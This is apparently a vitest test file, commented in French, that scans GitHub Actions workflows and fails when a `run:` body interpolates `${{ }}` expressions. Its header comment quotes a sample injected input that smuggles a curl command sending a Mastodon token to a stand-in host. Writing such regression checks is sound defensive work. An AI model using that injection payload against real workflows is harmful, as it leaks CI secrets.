import { describe, it, expect } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import { parse } from 'yaml';

/*
 * Le défaut d'origine : `broadcast.yml` écrivait
 *     node scripts/broadcast.mjs --id "${{ github.event.inputs.billboard_id }}"
 * dans le corps d'un `run:`.
 *
 * `${{ }}` n'est pas une variable — c'est une substitution TEXTUELLE que GitHub
 * effectue dans la SOURCE du script avant que bash ne la lise. Les guillemets
 * écrits dans le fichier ne protègent donc rien : ceux de l'attaquant font
 * partie du texte substitué. `billboard_id` étant une entrée libre de
 * `workflow_dispatch`, la valeur
 *     x"; curl -d "$MASTODON_TOKEN" https://exemple.invalid; echo "
 * produisait une ligne de commande complète, exécutée dans un job dont le bloc
 * `env:` porte les huit secrets de diffusion.
 *
 * Ce contrôle n'existe pas pour vérifier la correction d'aujourd'hui — elle est
 * faite — mais pour que la prochaine étape ajoutée au fil des mois échoue au
 * lieu de rouvrir la brèche en silence. Aucun autre test ne lit les workflows.
 *
 * La règle est volontairement sans exception : « cette valeur-là vient de
 * GitHub, elle est sûre » est un raisonnement qu'il faudrait refaire à chaque
 * relecture, et qui finit toujours par être appliqué une fois de trop.
 */

const DOSSIER = path.resolve(process.cwd(), '.github/workflows');
const MOTIF = '$' + '{{'; // concaténé pour ne pas être soi-même un faux positif

type Etape = { name?: string; run?: unknown; env?: Record<string, unknown> };
type Job = { steps?: Etape[] };

const fichiers = fs.readdirSync(DOSSIER).filter((f) => f.endsWith('.yml') || f.endsWith('.yaml'));

describe('workflows GitHub Actions', () => {
  it('trouve au moins un workflow à contrôler', () => {
    // Sans ça, un dossier renommé ferait passer toute cette suite à vide.
    expect(fichiers.length).toBeGreaterThan(0);
  });

  it.each(fichiers)('%s est un YAML valide', (fichier) => {
    expect(() => parse(fs.readFileSync(path.join(DOSSIER, fichier), 'utf8'))).not.toThrow();
  });

  it.each(fichiers)('%s n’interpole aucune expression dans un corps run:', (fichier) => {
    const doc = parse(fs.readFileSync(path.join(DOSSIER, fichier), 'utf8')) as {
      jobs?: Record<string, Job>;
    };

    const exposees: string[] = [];
    for (const [nomJob, job] of Object.entries(doc.jobs ?? {})) {
      for (const etape of job.steps ?? []) {
        if (typeof etape.run === 'string' && etape.run.includes(MOTIF)) {
          const lignes = etape.run
            .split('\n')
            .filter((l) => l.includes(MOTIF))
            .map((l) => l.trim());
          exposees.push(`${nomJob} / ${etape.name ?? '(sans nom)'} : ${lignes.join(' ⏎ ')}`);
        }
      }
    }

    // Le message d'échec doit donner la ligne fautive : une assertion booléenne
    // nue obligerait à rouvrir le fichier pour savoir quoi corriger.
    expect(
      exposees,
      `Interpolation ${MOTIF} }} dans un corps run: — passer la valeur par un bloc env: et la lire via "$VAR".`
    ).toEqual([]);
  });
});
